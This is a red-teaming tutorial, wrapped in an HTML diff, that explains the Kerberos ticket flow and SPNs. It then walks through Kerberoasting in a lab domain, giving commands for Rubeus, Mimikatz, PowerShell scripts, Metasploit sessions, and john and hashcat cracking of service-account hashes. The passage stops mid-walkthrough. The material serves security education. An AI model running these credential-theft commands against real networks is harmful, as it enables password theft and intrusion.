@@ -1,0 +1,398 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Deep Dive into Kerberoasting Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-05-05T22:11:51+00:00">May 5, 2020</time><time class="updated" datetime="2025-05-10T20:56:52+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will discuss kerberoasting attacks and other multiple methods of abusing Kerberos authentication. But before that, you need to understand how Kerberos authentication works between client-server communication.</span></p>
+<p><span style="color: #0000ff;"><strong><em>“Kerberos is for authentication not for authorization, this lacuna allows kerberoasting”</em></strong></span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>SECTION A: Kerberos Authentication Flow</strong></span></li>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;">Kerberos &amp; Its Major Components</span></li>
+<li><span style="color: #000000;">Kerberos Workflow using Messages</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>SECTION B: Service Principle Name SPN</strong></span></li>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;">Service Principle Name SPN</span></li>
+<li><span style="color: #000000;">Important Points</span></li>
+<li><span style="color: #000000;">The SPN syntax has four elements</span></li>
+<li><span style="color: #000000;">Type of SPN</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>SECTION C: Kerberoasting Attack Walkthrough</strong></span></li>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;">What is Kerberoasting</span></li>
+<li><span style="color: #000000;">Kerberoasting Major Steps</span></li>
+<li><span style="color: #000000;">PART 1: OLD Kerberoasting Procedure on Host System</span>
+<ul>
+<li><span style="color: #000000;">Powershell Script</span></li>
+<li><span style="color: #000000;">Mimikatz</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">PART 2: NEW Kerberoasting Procedure on Host System</span>
+<ul>
+<li><span style="color: #000000;">Rubeus.exe</span></li>
+<li><span style="color: #000000;">ps1 Powershell Script</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">PART 3: OLD Kerberoasting Procedure on Remote System</span>
+<ul>
+<li><span style="color: #000000;">Powershell Empire</span></li>
+<li><span style="color: #000000;">Metasploit</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">PART 4: NEW Kerberoasting Procedure on Remote System</span>
+<ul>
+<li><span style="color: #000000;">PowerShell Empire</span></li>
+<li><span style="color: #000000;">Metasploit</span></li>
+<li><span style="color: #000000;">Impacket</span></li>
+<li><span style="color: #000000;">Pypykatz</span></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #000000;"><span style="color: #800000;">SECTION A: Kerberos Authentication Flow</span><span style="color: #800000;">    </span>      </span></h3>
+<h4><span style="color: #000000;"><strong>KERBEROS &amp; Its Major Components</strong></span></h4>
+<p><span style="color: #000000;">The Kerberos protocol defines how clients interact with a network authentication service. Clients obtain tickets from the Kerberos Key Distribution Center (KDC), and they submit these tickets to application servers when connections are established. It uses UDP port 88 by default and depends on the process of symmetric key cryptography.</span></p>
+<p><span style="color: #000000;"><strong><em>“Kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network”.</em></strong></span></p>
+<p><span style="color: #000000;">There are some key components in Kerberos authentication that play a crucial role in the entire authentication process.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3jLTUct-1js/XrHWMDk2nwI/AAAAAAAAj18/XDsyM4Ze1j0eX4NmcWozPqv1BT6TM6n_gCLcBGAsYHQ/s1600/0.png"/></p>
+<h4><span style="color: #000000;">Kerberos Workflow using Messages</span></h4>
+<p><span style="color: #000000;">In the Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos. For Kerberos tickets, AD uses the KRBTGT account in the AD domain.</span></p>
+<p><span style="color: #000000;">The image below shows that the major role played by KDC in establishing a secure connection between the server &amp; client and the entire process uses some special components as defined in the table above.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">As mentioned above, Kerberos uses symmetric cryptography for encryption and decryption. Let us get into more details and try to understand how encrypted messages are sent to each other. Here we use three colours to distinguish Hashes:</span></p>
+<ul>
+<li><span style="color: #000000;"><span style="color: #0000ff;"><strong>BLUE _KEY</strong></span>: User NTLM HASH</span></li>
+<li><span style="color: #000000;"><span style="color: #ffff00;"><strong>YELLOW_KEY</strong></span>: Krbtgt NTLM HASH</span></li>
+<li><span style="color: #000000;"><strong><span style="color: #ff0000;">RED_KEY</span>:</strong> Service NTLM HASH</span></li>
+</ul>
+<h5><span style="color: #800000;"><strong>STEPS:</strong></span></h5>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>1</strong><strong>:</strong></span> By sending the request message to KDC, client initializes communication as:</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_AS_REQ contains the following:</em></strong></span></h5>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;"><em>Username of the client to be authenticated.</em></span></li>
+<li><span style="color: #000000;"><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with Krbtgt account</em></span></li>
+<li><span style="color: #000000;"><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;">The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</span></p>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>2:</strong></span> The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</span></p>
+<p><span style="color: #000000;">Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_AS_REP contains the following:</em></strong></span></h5>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;"><strong><em>Username</em></strong></span></li>
+<li><span style="color: #000000;"><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></span>
+<ul>
+<li><span style="color: #000000;"><em>Session key</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGT</em></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong><em>TGT</em></strong><em>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></span>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Session key</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGT</em></span></li>
+<li><span style="color: #000000;"><em>PAC with user privileges, signed by KDC</em></span></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ra2AP_zESh8/XrHWQU71dCI/AAAAAAAAj2s/ceawY5lP3oc4Gk6EpPGOruk8iw6rp-58ACLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>3:</strong></span> The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_TGS_REQ </em></strong><em>contains:</em></span></h5>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;"><em>Encrypted data with the session key </em></span>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Timestamp</em></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><em>TGT</em></span></li>
+<li><span style="color: #000000;"><em>SPN of requested service e.g. SQL service</em></span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>4:</strong></span> The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash <strong>(Locked with Red Key) </strong>&amp; Some Encrypted Message using User Hash.</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_TGS_REP</em></strong><em> contai</em><em>ns:</em></span></h5>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Encrypted data with the session key:</em></span>
+<ul>
+<li><span style="color: #000000;"><em>Service session key</em></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><em>The expiration date of TGS</em></span></li>
+<li><span style="color: #000000;"><strong><em>TGS</em></strong><em>, (Service Hash: RED Key) which contains:</em></span>
+<ul>
+<li><span style="color: #000000;"><em>Service session key</em></span></li>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>The expiration date of TGS</em></span></li>
+<li><span style="color: #000000;"><em>PAC with user privileges, signed by KDC</em></span></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4JA1JafcRQY/XrHWUiwr_8I/AAAAAAAAj3Y/t5vqqaVmQIk2agRQA1xcXNakAisNY2YEQCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>5:</strong></span> The user sent the copy of TGS to the Application Server,</span></p>
+<h5><span style="color: #000000;"><strong><em>KRB_AP_REQ contains:</em></strong></span></h5>
+<ul>
+<li style="list-style-type: none;">
+<ul>
+<li><span style="color: #000000;"><em>TGS</em></span></li>
+<li><span style="color: #000000;"><em>Encrypted data with the service session key:</em></span>
+<ul>
+<li><span style="color: #000000;"><em>Username</em></span></li>
+<li><span style="color: #000000;"><em>Timestamp, to avoid replay attacks</em></span></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>6:</strong> </span>The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</span></p>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>7:</strong></span>  KDC verifies PAC (Optional)</span></p>
+<p><span style="color: #000000;"><span style="color: #800000;"><strong>8:</strong></span>  Allow the user to access the service for a specific time.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-r9n3KjkUnEA/XrHWXoekP0I/AAAAAAAAj34/-TxhbaGw0y4pKdFnuzs0iaRfubshleYRQCLcBGAsYHQ/s1600/4.png"/></p>
+<h3><span style="color: #800000;">SECTION B: Service Principal Name SPN</span></h3>
+<h4><span style="color: #000000;">Service Principal Name  </span></h4>
+<p><span style="color: #000000;">The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</span></p>
+<h4><span style="color: #000000;">Important Points</span></h4>
+<ol>
+<li><span style="color: #000000;">If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN. </span></li>
+<li><span style="color: #000000;">Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</span></li>
+<li><span style="color: #000000;">A given SPN can be registered on only one account. </span></li>
+<li><span style="color: #000000;">An SPN must be unique in the forest in which it is registered.</span></li>
+<li><span style="color: #000000;">If it is not unique, authentication will fail.</span></li>
+</ol>
+<h4><span style="color: #000000;">The SPN syntax has four elements </span></h4>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-th0YuiufURI/XrHWXq94owI/AAAAAAAAj30/HJIYMqw_59gKPoOkVd5isFOaHXBYsAsXwCLcBGAsYHQ/s1600/5.png"/></p>
+<h4><span style="color: #000000;">Type of SPN</span></h4>
+<ul>
+<li><span style="color: #000000;">Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days, hence it is no use in Kerberoasting attacks</span></li>
+<li><span style="color: #000000;">SPNs that have been associated with a domain user account where NTLM hash will be used.</span></li>
+</ul>
+<h3><span style="color: #800000;">Section C: Kerberoasting Attack Walkthrough </span></h3>
+<h4><span style="color: #000000;">What is Kerberoasting?</span></h4>
+<p><span style="color: #000000;">Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password.</span></p>
+<p><span style="color: #000000;">As explained above, the Kerberos uses NTLM hash of the requested Service for encrypting KRB_TGS ticket for given service principal names (SPNs). When a domain user sent a request for TGS ticket to domain controller KDC for any service that has registered SPN, the KDC generates the KRB_TGS without identifying the user authorization against the requested service.</span></p>
+<p><span style="color: #000000;">An attacker can use this ticket offline to brute force the password for the service account since the ticket has been encrypted in RC4 with the NTLM hash of the service account.</span></p>
+<h4><span style="color: #000000;">Kerberoasting Major Steps</span></h4>
+<p><span style="color: #000000;">This attack is a multiple-step process as given below:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VPFCAdjSj9M/XrHWYDPRB4I/AAAAAAAAj38/pXVzbz5X12AF9FwxyQWUE0KNUFI6pifFwCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;"><strong>0</strong>: Access the Client system of the domain network by Hook or Crook.</span></p>
+<p><span style="color: #000000;"><strong>1:</strong> Discover or scan the registered SPN.</span></p>
+<p><span style="color: #000000;"><strong>2:</strong> Request for TGS ticket for discovered SPN using Mimikatz or any other tool.</span></p>
+<p><span style="color: #000000;"><strong>3:</strong> Dump the TGS ticket which may have extention .kirbi or ccache or service HASH (in some scenario)</span></p>
+<p><span style="color: #000000;"><strong>4:</strong> Convert the .kirbi or ccache file into a crackable format</span></p>
+<p><span style="color: #000000;"><strong>5:</strong> Use a dictionary for the brute force attack.</span></p>
+<p><span style="color: #000000;">We have attack categories such as OLD or NEW kerberoasting on the Host or Remote system.</span></p>
+<p><span style="color: #000000;"><strong>OLD Procedure:</strong> These are techniques where multiple kerberoasting steps are performed.</span></p>
+<p><span style="color: #000000;"><strong>NEW Procedure:</strong> These are single-step techniques used for kerberoasting.</span></p>
+<h4><span style="color: #000000;">PART 1: OLD  Kerberoasting Procedure on Host System</span></h4>
+<h5><span style="color: #000000;">Method 1: Powershell Script</span></h5>
+<p><span style="color: #000000;"><strong>Step 1: </strong>SPN Discover</span></p>
+<p><span style="color: #000000;">Download “Find-PotentiallyCrackableAccounts.ps1” &amp; “Export-PotentiallyCrackableAccounts.ps1” from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/cyberark/RiskySPN/blob/master/Find-PotentiallyCrackableAccounts.ps1">here</a> </strong> </span>on the host machine. These scripts will discover the SPN and save the output in CSV format.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Find-PotentiallyCrackableAccounts.ps1
+Find-PotentiallyCrackableAccounts.ps1 -FullData -Verbose
+Import-Module .\Export-PotentiallyCrackableAccounts.ps1
+Export-PotentiallyCrackableAccounts</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-imqWTR_2zD8/XrHWY-rpeZI/AAAAAAAAj4A/b5zRC7rNdQ0iNKICQC88S3HMgY3l7uj4QCLcBGAsYHQ/s1600/7.png"/></strong></span></p>
+<p><span style="color: #000000;">Another powershell script <strong>“GetUserSPns .ps1”</strong> Download it from <strong><a style="color: #000000;" href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1"><span style="color: #0000ff;">here</span></a> </strong>it will Query the domain to discover the SPNs that use User accounts as you can observe that we have found SPN name with the help of followed command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\GetUserSPns .ps1</pre>
+<p><span style="color: #000000;">Import the module in the powershell run the said command here I have enumerated SPN for SQL Service.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DIR6N2V_6yY/XrHWZJApiyI/AAAAAAAAj4E/Mm7s9F-yLmcN4Tj5jqg6BkIu7wlfxeSKACLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Extract &amp; Dump TGS_ticket &amp; Obtain Hash</span></p>
+<p><span style="color: #000000;">Here, I try to extract the KRB_TGS from inside the host memory with the help of another PowerShell script called <strong>“TGSCipher.ps1”</strong> which you can download from <strong><a style="color: #000000;" href="https://github.com/cyberark/RiskySPN/blob/master/Get-TGSCipher.ps1"><span style="color: #0000ff;">here</span></a> </strong>and simultaneously convert the request output it into John format.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-TGSCipher -SPN "WIN-S0V7KMTVLD2/SVC_SQLService.ignite.local:60111" -Format John</pre>
+<p><span style="color: #000000;">As a result, we obtain the HASH string for the SQL Service.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ecfq59EnyUU/XrHWZQ186pI/AAAAAAAAj4I/Kse_y11qUXY-hC0xUMGm4-CWh5mql3msgCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;"><strong>Step 3: </strong>Brute Force HASH</span></p>
+<p><span style="color: #000000;">Now, this is the last and desired phase where we have used a dictionary for brute-forcing the HASH, thus we saved above-enumerated hash in a text file and run the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/rockyou.txt hashes</pre>
+<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-lwq1jbanvt8/XrHWMiDBANI/AAAAAAAAj2A/nkHZQvGRbQAjtSqPyGIUGsV5TcvJp9O5QCLcBGAsYHQ/s1600/10.png"/></strong></p>
+<p><span style="color: #000000;">Boom! Boom!!! And we’ve made a successful kerberoasting attack by obtaining a password for the SQL service.</span></p>
+<h5><span style="color: #000000;"><strong>Method 2: Mimikatz</strong></span></h5>
+<p><span style="color: #000000;">Similarly, you can use Mimikatz for the entire attack, which means it can be used for SPN discovery and dumping the TGS ticket.</span></p>
+<p><span style="color: #000000;"><strong>Step 1: </strong>SPN Discovery</span></p>
+<p><span style="color: #000000;">Download and execute the mimikatz &amp; run Kerberos::list command for SPN discovery.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./mimikatz.exe
+kerberos::list</pre>
+<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-NytBBMrygQk/XrHWNfC_xKI/AAAAAAAAj2I/-MzWn8RqrlYd9oTcCZdJ64nC3D8kA12WACLcBGAsYHQ/s1600/11.png"/></strong></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Dump TGS ticket</span></p>
+<p><span style="color: #000000;">Run the export command for extracting the ticket named contains .kirbi extension.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list /export</pre>
+<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-IE-FJj4m_6o/XrHWNqhwjAI/AAAAAAAAj2M/v2G8ZDTVlpQo7XbkKmX5U9ibUtyVG47DgCLcBGAsYHQ/s1600/12.png"/></strong></p>
+<p><span style="color: #000000;"><strong>Step 3: </strong>Convert the Kirbi to Hash &amp; Brute Force Hash</span></p>
+<p><span style="color: #000000;">I renamed the obtain file name as “1-40a5000…..kirbi” into “raj.kirbi” and again convert raj.kirbi into john crackable format with the help of <strong>kirbi2john.py</strong> (possible at /usr/share/john/) named as “kirbihash”; then use john for brute force as done in 1st Method.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv "1-40a5000…..kirbi" "raj.kirbi"
+/usr/share/john/kirbi2john.py raj.kirbi &gt; kirbihash
+john --wordlist=/usr/share/wordlists/rockyou.txt kirbihash</pre>
+<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-A-t0auy9wMo/XrHWOPLnGtI/AAAAAAAAj2Q/YxXrl3PDhXsdZstiJWqRY8auOCdyT_FsQCLcBGAsYHQ/s1600/13.png"/></strong></p>
+<h4><span style="color: #000000;">PART 2: NEW Kerberoasting Procedure on Host System</span></h4>
+<h5><span style="color: #000000;"><strong>Method 1: Rubeus.exe</strong></span></h5>
+<p><span style="color: #000000;"><strong>Step 1: </strong>SPN Discover, Dump TGS, obtain HASH (All-in-one)</span></p>
+<p><span style="color: #000000;">Rebeus.exe is a terrific tool as it comes with a kerberoast module that discovers SPN, extracts TGS, and dump service Hash, which can be done with the help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./Rubeus.exe kerberoast /outfile:hash.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Ycw3Ri1m4Zo/XrHWOWPxiEI/AAAAAAAAj2U/-_0vHHk1fWM2VwIHvvgPjGrisFmx9-nowCLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">So, we have saved the service hash in the text file “hash.txt” and use a dictionary to brute force the hash and extract the service password using hashcat tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 13100 --force -a 0 hash.txt dict.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4oUwq_S5OLE/XrHWOnUae8I/AAAAAAAAj2Y/RHbEdpqu-scjJ4gsr8slE1e1p3g-EId4QCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">As a result, you can observe that we have extracted the password of the service.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Z7e2h6PD1_Q/XrHWPEIyjKI/AAAAAAAAj2c/w_u8JHkySzk6Vt550U3ZzghOGs60HuL9ACLcBGAsYHQ/s1600/16.png"/></p>
+<h5><strong><span style="color: #000000;">Method 2: Kerberoast PowerShell Script</span></strong></h5>
+<p><span style="color: #000000;"><strong>Step 1:</strong> SPN Discover, Dump TGS, obtain HASH (All-in-one)</span></p>
+<p><span style="color: #000000;">Kerberoast.ps1 is a PowerShell script which is as similar above module, you can download it from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">here</a></span></strong>, it discovers the SPN, extract TGS and dump service Hash, this can be done with the help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Invoke-kerberoast.ps1
+Invoke-kerberoast</pre>
+<p><span style="color: #000000;">Once you get the service hash, follow the above method to brute force the password.</span></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, repeat the same procedure to brute force the hashes.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Nckuu-NZpDU/XrHWPTtl8sI/AAAAAAAAj2g/UBBORNlMb4QEA3BbLqsSK87dYe56A6gGQCLcBGAsYHQ/s1600/17.png"/></p>
+<h4><span style="color: #000000;">PART 3: OLD Kerberoasting Procedure on Remote System</span></h4>
+<h5><strong><span style="color: #000000;">Method 1: Metasploit</span></strong></h5>
+<p><strong>1. PowerShell script via meterpreter</strong></p>
+<p><span style="color: #000000;"><strong>Step1: </strong> SPN Discovery</span></p>
+<p><span style="color: #000000;">Download “Find-PotentiallyCrackableAccounts.ps1” &amp; “Export-PotentiallyCrackableAccounts.ps1” from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/cyberark/RiskySPN/blob/master/Find-PotentiallyCrackableAccounts.ps1">here</a></span> </strong>in your local machine and upload it on the host machine through meterpreter session, then invoke PowerShell to execute the script remotely.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-v5xSgRLBuP8/XrHWP4zrosI/AAAAAAAAj2k/4k-jn0Q4_fUKnoSOKrECH828ZnnQo7NIACLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">These scripts will discover the SPN and save the output in CSV format.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Find-PotentiallyCrackableAccounts.ps1
+Find-PotentiallyCrackableAccounts -FullData -Verbose
+Import-Module .\Export-PotentiallyCrackableAccounts.ps1
+Export-PotentiallyCrackableAccounts</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-btNRuEvMyZY/XrHWQUXalgI/AAAAAAAAj2o/PTG9FCbKYxkmaf-MIhkW6vhgO4RcfKhdwCLcBGAsYHQ/s1600/19.png"/></strong></span></p>
+<p><span style="color: #000000;">Then, download the Report.csv in your local machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-P_ptf1eS0eU/XrHWQ9U7ogI/AAAAAAAAj2w/MXctXM5CcTc16cWi74iefR9KeytGhn9nACLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">The report.csv file will list the SPNs available in the host system.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VATCHi6M_CQ/XrHWRe4IraI/AAAAAAAAj20/tdi2ZzszneIbWPZE4RJBaA7d2-Vswc40wCLcBGAsYHQ/s1600/21.png"/></p>
+<h5><span style="color: #000000;"><strong>Setspn – SPN Discovery Utility</strong></span></h5>
+<p><span style="color: #000000;">Another method, obtain the meterpreter session by compromising the host machine and load PowerShell. Use setspn utility to list all SPNs in the domain.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">setspn -T ignite -Q */*</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-38c5aSoQA04/XrHWSNlk8lI/AAAAAAAAj28/UNwg9AU-riclPhAiqlJh9sifXaxwPpzcACLcBGAsYHQ/s1600/22.png"/></p>
+<p><span style="color: #000000;">As you can observe that again we have discovered the SPN for SQL service</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PbAquzmGeCQ/XrHWR1EjT5I/AAAAAAAAj24/EJRU_D6TvAsnTVXw2ygiXCF7v2xyHmyuACLcBGAsYHQ/s1600/23.png"/></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Extract &amp; Dump TGS_ticket &amp; Obtain Hash</span></p>
+<p><span style="color: #000000;">Upload the PowerShell script <strong>“TGSCipher.ps1”</strong> and simultaneously convert the request output it into John format.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Get-TGSCipher.ps1
+Get-TGSCipher -SPN "WIN-S0V7KMTVLD2/SVC_SQLService.ignite.local:60111" -Format John</pre>
+<p><span style="color: #000000;">As a result, we obtain the HASH string for the SQL Service.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ajU6tT2t8xw/XrHWSqe83jI/AAAAAAAAj3A/g2CkBrMkHXgby5YjRIhCHQ9D9CSuD38AQCLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;"><strong>Step 3: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, repeat the same procedure to brute force the hashes.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-sMfsRdf0uT4/XrHWVcCbxaI/AAAAAAAAj3g/KtVMKbh5eXAv892Bjy92UeKNTsgqaiiCACLcBGAsYHQ/s1600/31.png"/></p>
+<h5><span style="color: #000000;"><strong>2. Mimikatz via Metasploit</strong> </span></h5>
+<p><span style="color: #000000;">Once you have the meterpreter session of the host system then you can try to upload mimikatz.exe and then perform all steps discussed in Part 1 of section C.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-vlloo87PU5Q/XrHWTRPSeeI/AAAAAAAAj3I/nCdvvCnzHEE936wBv0KZM0-Y_rBZUpx2ACLcBGAsYHQ/s1600/26.png"/></p>
+<p><span style="color: #000000;"><strong>Step 1:</strong> SPN Discovery</span></p>
+<p><span style="color: #000000;">Download and execute the mimikatz &amp; run Kerberos::list command for SPN discovery</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./mimikatz.exe
+kerberos::list</pre>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Dump TGS ticket</span></p>
+<p><span style="color: #000000;">Run the export command for extracting the ticket named with .kirbi extension.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list /export</pre>
